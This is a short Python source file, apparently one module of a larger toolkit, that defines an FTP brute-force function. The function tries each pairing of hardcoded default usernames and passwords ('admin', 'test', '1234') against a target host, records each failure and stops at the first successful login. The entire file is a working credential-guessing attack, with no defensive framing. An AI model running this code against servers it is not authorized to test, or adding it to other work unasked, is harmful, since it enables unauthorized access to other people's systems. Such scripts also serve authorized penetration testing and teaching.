from ftplib import FTP
from logger import log_output

def ftp_brute_force(host):
    usernames = ['admin', 'test']
    passwords = ['1234', 'admin', 'test']
    result = f"FTP brute force results for {host}:\n"

    for user in usernames:
        for passwd in passwords:
            try:
                ftp = FTP(host)
                ftp.login(user, passwd)
                line = f"[+] Success: {user}:{passwd}"
                print(line)
                result += line + "\n"
                ftp.quit()
                log_output("FTP Brute Forcer", result)
                return
            except:
                result += f"[-] Failed: {user}:{passwd}\n"
    log_output("FTP Brute Forcer", result)